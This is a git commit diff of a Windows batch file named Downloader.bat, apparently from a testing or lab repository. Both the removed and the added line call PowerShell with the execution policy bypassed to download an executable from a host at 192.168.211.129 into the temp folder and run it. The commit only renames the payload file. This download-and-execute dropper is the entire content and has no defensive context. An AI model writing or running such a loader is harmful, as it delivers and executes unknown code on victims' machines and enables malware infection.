5ea62e261629e46b1a23cd162b95edf5692988c9
crtesthy <140674029+crtesthy@users.noreply.github.com>
2023-10-17 17:43:41 +0900

    Add files via upload

--- Downloader.bat
+++ Downloader.bat
@@ -1,2 +1,2 @@
 @echo off
-C:\Windows\System32\cmd.exe /c powershell.exe -executionpolicy bypass -command (New-object System.Net.WebClient).DownloadFile('http://192.168.211.129/UFO0929.exe', $env:Temp + '\UFO0929.exe'); Invoke-Item "$env:Temp\UFO0929.exe"
+C:\Windows\System32\cmd.exe /c powershell.exe -executionpolicy bypass -command (New-object System.Net.WebClient).DownloadFile('http://192.168.211.129/test20231011.exe', $env:Temp + '\test20231011.exe'); Invoke-Item "$env:Temp\test20231011.exe"
